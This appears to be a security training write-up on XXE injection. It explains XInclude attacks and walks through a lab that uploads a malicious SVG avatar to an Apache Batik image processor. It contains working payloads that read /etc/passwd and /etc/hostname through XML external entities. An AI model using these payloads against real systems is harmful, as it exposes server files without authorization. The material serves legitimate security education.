# Exploiting XXE to Extract Files, Perform SSRF, and Handle Blind XXE ðŸš¨

XXE (XML External Entity) is a vulnerability that allows attackers to extract files from a server, perform SSRF attacks, and exploit "blind" XXE vulnerabilities. This guide covers all these scenarios with detailed examples. ðŸ’¡

---

## Discovering Hidden Attack Surfaces for XXE Injection

The attack surface for XXE injection vulnerabilities is often apparent because typical HTTP traffic in an application includes requests containing XML data. However, in some cases, the attack surface is less obvious. By inspecting the right places, you can uncover XXE attack surfaces in requests that do not explicitly include XML.

### XInclude Attacks

Some applications take user-supplied data, embed it server-side into an XML document, and then parse the document. An example of this is when user-supplied data is included in a backend SOAP request, which is subsequently processed by a SOAP service.

In such cases, you cannot perform a classical XXE attack because you do not control the entire XML document and cannot define or modify a DOCTYPE element. However, you can leverage XInclude instead. XInclude is part of the XML specification that allows creating an XML document from subdocuments. You can place an XInclude attack in any data value within the XML document, making the attack possible even when you control only a single data element that gets embedded into a server-side XML document.

To perform an XInclude attack, you need to reference the XInclude namespace and specify the file path you want to include. For example:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

## Example Lab Exercise: File Upload-based XXE Attacks

Some applications allow users to upload files, which are then processed server-side. Common file formats either use XML or include XML-based components. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.

For instance, an application might allow users to upload images and process or validate them server-side. Even if the application expects formats like PNG or JPEG, the image processing library might support SVG. Since SVG uses XML, an attacker can upload a malicious SVG image, thereby reaching a hidden XXE attack surface.

---

### Lab Description

This lab allows users to attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the `/etc/hostname` file after processing. Then use the **"Submit Solution"** button to submit the server's hostname.

### Steps to Execute

### 1. Navigate to a Post
You are presented with a list of posts. Select any post:

![Post List](https://github.com/user-attachments/assets/b586ef61-9664-4731-9253-e6a1fe924c30)

---

### 2. Access the Comment Section
At the bottom of the post, there is an option to leave a comment:

![Comment Section](https://github.com/user-attachments/assets/5052e9f9-f64a-477d-877b-904b37eac029)

---

### 3. Create a Malicious SVG File
Create an SVG file with the following content:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

---

### 4. Submit the Comment
Fill in any values in the comment form, upload your malicious SVG file, and submit the comment:

![Submitting the SVG File](https://github.com/user-attachments/assets/7767104b-0a0c-4252-bcfa-6a355c903008)

---

### 5. View the Output
Your comment's avatar will display the contents of `/etc/hostname` in the small avatar window:

![Displayed Hostname](https://github.com/user-attachments/assets/42fb9328-3eca-456f-84fa-bb122028d9a4)
